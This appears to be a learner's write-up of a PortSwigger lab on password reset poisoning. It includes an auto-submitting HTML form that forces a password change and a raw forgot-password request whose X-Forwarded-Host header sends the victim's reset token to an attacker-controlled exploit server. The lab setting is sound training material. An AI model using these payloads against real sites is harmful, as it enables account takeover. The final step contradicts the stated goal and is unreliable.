# Lab: Password reset poisoning via middleware
## Description

1. Login to `wiener`. Get email address.
2. Go to password reset function and reset his email
3. I first attempted to take the password reset POST method and converting it into a GET request, but the server-side didn't accept that. So we cannot construct a simple link that will trigger a password reset - it has to be POST.
4. Use the exploit server to create trigger a POST request being sent.
HTTP Header:
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
```
HTTP body
```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac011f681f9de65ec0a017d50033001e.web-security-academy.net/forgot-password?temp-forgot-password-token=mfUUjPVdCGMCgxzzM1nAfRX27GNes4hY" method="POST">
      <input type="hidden" name="temp&#45;forgot&#45;password&#45;token" value="mfUUjPVdCGMCgxzzM1nAfRX27GNes4hY" />
      <input type="hidden" name="new&#45;password&#45;1" value="password" />
      <input type="hidden" name="new&#45;password&#45;2" value="password" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
NOTE: The token only works once, so I had to keep updating it.
5. First I tried to add the link to the exploit in a blog post comment because I didn't care to read the lab description carefully enough. I only read `The user carlos will carelessly click on any links` and ommitted the following words `in emails that he receives`.
6. I shifted focus to the `forgot password` function and read the article about [password reset poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning). 
7. I fianlly found the issue. By adding `X-Forwarded-Host: exploit-acdc1f4b1f7836d9c098a85701f000a9.web-security-academy.net` to the request the link in the email send to user would point to any hostname specified. By pointing the hostname to our exploit server should be enough to trick Carlos to click on the link and send his password reset token to us.
```yaml
POST /forgot-password HTTP/1.1
Host: acf01fa21fc936adc01da89800220034.web-security-academy.net
Content-Length: 83
X-Forwarded-Host: exploit-acdc1f4b1f7836d9c098a85701f000a9.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=carlos%40exploit-acdc1f4b1f7836d9c098a85701f000a9.web-security-academy.net
```
But, this didn't do the trick. Instead of trying to guess Carlos' email address, we can simply set guess the username `username=carlos`
8. The password reset token should not show up in the Exploit Server access logs.


## Solution
See description
